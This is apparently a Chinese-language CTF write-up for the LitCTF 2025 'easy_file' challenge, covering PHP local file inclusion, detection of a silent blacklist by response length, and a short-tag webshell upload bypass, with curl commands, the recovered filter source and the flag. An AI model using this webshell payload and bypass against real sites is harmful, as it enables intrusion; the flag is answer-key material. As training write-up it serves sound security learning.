---
type: source
created: 2026-05-10
updated: 2026-05-10
related: []
---

# [LitCTF 2025] easy_file (NSSCTF)

PHP LFI + 上传组合。黑名单静默（命中后既无警告也无输出，只能靠响应长度基线识别），用 `<?=` 短标签绕过 `/<\?php/i` 上传过滤，include 本地 `.jpg` 拿 webshell。

涉及概念：[[concepts/silent-waf-length-baseline]]、[[concepts/php-short-tag-upload-bypass]]
涉及实体：[[entities/ctf_nssctf]]

## 挑战

`http://node6.anna.nssctf.cn:23854/`，PHP 7.3.33 / nginx / Alpine。登录页 HTML 尾部注释 `//file查看头像` 是明示。

## 流程

### 1. 登录

前端 JS `btoa(utf8(value))` 把用户名/密码 base64 后 POST 到 `login.php`。试 `admin/password` 302 到 `admin.php`。

```bash
U=$(echo -n admin | base64); P=$(echo -n password | base64)
curl -c cookies.txt -X POST "$URL/login.php" \
  --data-urlencode "username=$U" --data-urlencode "password=$P"
```

### 2. 识别 LFI + 静默 WAF

`admin.php?file=/etc/passwd` 直接回显 → LFI。
`file=/flag.php` 无 warning 也无 echo → 文件存在但只定义变量。
`file=php://filter/...` 无 warning **也无 base64** → 疑似被黑名单静默吃掉。

靠长度基线对比确认：

| `file=` | len | 判断 |
|---|---|---|
| `bogus` / 空 | 2353–2387 | warning |
| `php` / `phpx` / `xphp` / `http://x` / `file://x` | **2072** | 静默丢弃 |
| `filter://` / `test://` | 2700+ | warning（未知 wrapper） |

命中黑名单的响应长度 = include 根本没跑时的基线。详见 [[concepts/silent-waf-length-baseline]]。

### 3. 上传绕过 + 短标签

上传限制：扩展名必须 `txt`/`jpg`；正则 `preg_match("/<\?php/i", $file_content)` 拦 PHP 长标签。

**绕法**：`<?= system($_GET[0]); ?>`（短输出标签，不被 `/<\?php/i` 匹配，PHP 7.3 `<?=` 永远开启）。扩展名用 `.jpg`，路径 `uploads/s1.jpg` 不含 `php`。见 [[concepts/php-short-tag-upload-bypass]]。

### 4. 包含 + 执行

```bash
curl -b cookies.txt --get "$URL/admin.php" \
  --data-urlencode "file=uploads/s1.jpg" \
  --data-urlencode "0=cat /var/www/html/flllag.php"
```

flag 藏在 `/var/www/html/flllag.php`（三个 l 反诱骗），环境变量 `FLAG=no_FLAG` 是诱饵。

## 源码复盘

shell 拿到后 `cat admin.php` 看到真身：

```php
$block = ['file','http','https','ftp','php','zlib','data','glob','phar','ssh2','rar','ogg','expect','log'];
foreach ($block as $w) {
    if (stripos($file, $w) !== false) { $include_result = "WAF!"; $isBlocked = true; break; }
}
if (!$isBlocked) include($file);
```

但 `$include_result` 在模板里从未被打印 → 静默 WAF。

上传：

```php
if ($ext != 'txt' && $ext != 'jpg') $upload_result = "恶意后缀";
elseif (preg_match("/<\?php/i", $file_content)) $upload_result = "你的文件内容不太对劲哦";
```

## Flag

```
NSSCTF{14120fcc-ee35-4b6f-9a15-d1c4d64bc2b6}
```

## 踩坑

1. **静默 WAF 只能靠长度对比**：赋值给变量但模板不显示时肉眼看不到 "WAF!" 字样
2. **PHP `<?=` 永远开启**：不受 `short_open_tag` 影响，7.0+ 通杀
3. **include 看内容不看扩展名**：`.jpg` 里有 `<?= ... ?>` 照样执行
4. **LFI 三态**：直接回显 / warning / 无回显无 warning，最后一种最难判
